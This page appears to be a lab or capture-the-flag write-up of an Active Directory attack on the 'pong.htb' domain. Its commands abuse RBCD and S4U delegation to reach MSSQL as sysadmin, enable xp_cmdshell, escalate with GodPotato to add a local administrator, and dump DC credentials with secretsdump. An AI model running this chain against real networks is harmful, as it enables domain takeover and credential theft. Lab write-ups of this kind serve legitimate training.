# RBCD on svc\_sql + S4U → MSSQL sysadmin

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-05-03 at 2.49.07 in the afternoon.png" alt=""><figcaption></figcaption></figure>

#### **We get gMSA SID**

{% code overflow="wrap" %}
```bash
Get-ADServiceAccount -Identity Pong_gMSA -Properties objectSid
```
{% endcode %}

We got the SID

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

We define the gMSA SID

{% code overflow="wrap" %}
```powershell
$gmsaSid = "S-1-5-21-2410575906-3092493790-2123333151-1123"
```
{% endcode %}

**We configure RBCD via LDAP**

Inside the PS Session as C.Carlssen

{% code overflow="wrap" %}
```powershell
$svc = New-Object System.DirectoryServices.DirectoryEntry(
  "LDAP://dc2.pong.htb/CN=svc_sql,OU=Service Accounts,DC=pong,DC=htb")

$sd = New-Object System.Security.AccessControl.RawSecurityDescriptor(
  "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$gmsaSid)")

$bytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($bytes,0)

$svc.Properties['msDS-AllowedToActOnBehalfOfOtherIdentity'].Value = $bytes
$svc.CommitChanges()
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

We impersonate a user via Kerberos delegation

{% code overflow="wrap" %}
```bash
getST.py -k -no-pass \
  -spn 'mssqlsvc/dc2.pong.htb' \
  -impersonate 'c.adam' \
  -dc-ip 192.168.2.2 'pong.htb/Pong_gMSA$'
```
{% endcode %}

**We access MSSQL via Kerberos impersonation**

{% code overflow="wrap" %}
```bash
KRB5CCNAME='c.adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache' mssqlclient.py -k -no-pass \
  'pong.htb/c.adam@dc2.pong.htb' -dc-ip 192.168.2.2 -port 1433
```
{% endcode %}

We enable xp\_cmdshell and execute commands

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">SELECT IS_SRVROLEMEMBER('sysadmin');
<strong>
</strong>EXEC sp_configure 'show advanced options', 1; 
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1; 
RECONFIGURE;


EXEC xp_cmdshell 'whoami';
</code></pre>

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-05-03 at 2.52.54 in the afternoon.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-05-03 at 2.54.10 in the afternoon.png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/BeichenDream/GodPotato" %}

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-05-03 at 2.54.42 in the afternoon.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
icacls C:\Windows\Tasks\GodPotato.exe /grant Everyone:RX
```
{% endcode %}

#### **We add a user to Administrators via GodPotato**

{% code overflow="wrap" %}
```bash
EXEC xp_cmdshell 'C:\Windows\Tasks\GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators C.Carlssen /add"';
```
{% endcode %}

#### We dump DC secrets with Kerberos

{% code overflow="wrap" %}
```bash
export KRB5CCNAME=c.carlssen.ccache

secretsdump.py -k -no-pass 'pong.htb/c.carlssen@dc2.pong.htb' \
   -dc-ip 192.168.2.2 -target-ip 192.168.2.2 \
   -just-dc-user r.martinelli
```
{% endcode %}
